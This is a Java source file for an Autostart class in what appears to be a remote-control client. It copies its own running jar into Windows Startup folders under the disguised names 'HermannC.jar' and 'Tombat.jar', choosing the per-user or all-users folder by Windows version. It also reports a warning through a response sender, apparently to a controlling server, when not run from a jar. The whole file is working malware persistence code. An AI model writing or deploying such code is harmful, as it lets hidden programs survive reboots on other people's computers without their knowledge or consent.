package ch.lebois.client.configure;

import ch.lebois.client.ClientApplication;
import ch.lebois.client.handler.ResponseSender;
import ch.lebois.client.service.DownloadService;

import java.io.File;

public class Autostart {

    private void autostartWin10() {
        try {
            String filename = new File(ClientApplication.class.getProtectionDomain().getCodeSource().getLocation()
                    .getPath()).getName();

            if (filename.endsWith(".jar")) {
                new DownloadService().download("file:///"
                                + Autostart.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath(),
                        System.getProperty("java.io.tmpdir").replace("Local\\Temp\\",
                                "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\HermannC.jar"));
            } else {
                notFromJar(filename);
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void autostartWin7() {
        try {

            String filename = new File(ClientApplication.class.getProtectionDomain().getCodeSource().getLocation()
                    .getPath()).getName();

            if (filename.endsWith(".jar")) {
                new DownloadService().download("file:///"
                                + Autostart.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath(),
                        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Tombat.jar");
            } else {
                notFromJar(filename);
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private void notFromJar(String filename) {
        new ResponseSender("warning", "Not started from jar: started from " + filename);
    }

    public void decide() {


        switch (System.getProperty("os.name")) {
            case "Windows 10":
                autostartWin10();
                break;
            case "Windows 7":
                autostartWin7();
                break;
            default:
                autostartWin10();
                autostartWin7();
                break;
        }
    }
}
